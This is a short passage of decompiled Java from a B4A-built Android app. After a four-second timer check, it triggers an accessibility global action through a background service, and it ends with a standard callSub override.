        BA activityBA = getActivityBA();
        long j = this._lasttimechecked;
        DateTime dateTime = Common.DateTime;
        if (dateutils._periodbetween(activityBA, j, DateTime.getNow()).Seconds > 4) {
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = backgroundservice._acs;
            AccessibilityConstants accessibilityConstants = backgroundservice._accservconstants;
            accessibilityEventsListener.PerformGlobalAction(4);
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener2 = backgroundservice._acs;
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
        }
        return "";
    }

    @Override // anywheresoftware.b4a.BA.SubDelegator
    public Object callSub(String str, Object obj, Object[] objArr) throws Exception {
        BA.senderHolder.set(obj);
        return BA.SubDelegator.SubNotFound;
    }
}
